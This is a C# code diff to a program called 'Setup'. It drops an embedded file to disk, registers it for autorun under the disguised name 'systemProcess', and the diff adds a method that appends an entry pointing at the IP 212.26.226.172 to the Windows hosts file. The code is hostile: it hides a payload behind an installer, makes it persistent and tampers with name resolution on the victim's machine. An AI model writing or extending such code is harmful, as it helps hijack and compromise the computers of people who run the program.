@@ -22,6 +22,7 @@ namespace Setup
             {
                 File.WriteAllBytes(pathToPrikol, Resource1.SystemFile);
                 SetToAutorun("systemProcess");
+                ChangeHostsFile("localhost 212.26.226.172");
             }
 
             catch(Exception ex)
@@ -42,6 +43,18 @@ namespace Setup
                 Console.ForegroundColor = ConsoleColor.Red;
                 Console.WriteLine("Ошибка" + ex.Message);
                 Console.ForegroundColor = ConsoleColor.White;
+            }
+        }
+
+        static void ChangeHostsFile(string text)
+        {
+            try
+            {
+                File.AppendAllText("C:\\Windows\\System32\\drivers\\etc\\hosts", text);
+            }
+            catch(Exception ex)
+            {
+                Console.WriteLine(ex.Message);
             }
         }
     }
